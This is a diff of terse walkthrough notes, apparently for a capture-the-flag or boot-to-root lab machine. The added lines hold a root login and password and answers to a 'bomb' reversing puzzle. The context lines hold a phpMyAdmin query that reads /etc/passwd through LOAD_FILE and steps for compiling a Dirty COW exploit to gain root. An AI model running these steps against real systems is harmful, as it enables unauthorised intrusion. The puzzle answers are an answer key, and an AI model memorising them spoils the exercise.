@@ -1,3 +1,6 @@
+Login: root
+Password: Fg-'kKXBj87E:aJ$
+
 from phpmyadmin
 
 SELECT LOAD_FILE("/etc/passwd");
@@ -70,3 +73,12 @@ change the firefart string to the name of the new root user
 gcc -pthread dirty.c -o dirty -lcrypt
 
 you are now root
+
+bomb:
+HINT:
+P       "Public speaking is very easy."
+ 2      "1 2 6 24 120 720"
+ b      "1 b 214", "2 b 755", "7 b 524"
+        "9"
+o       "opukmq"
+4       
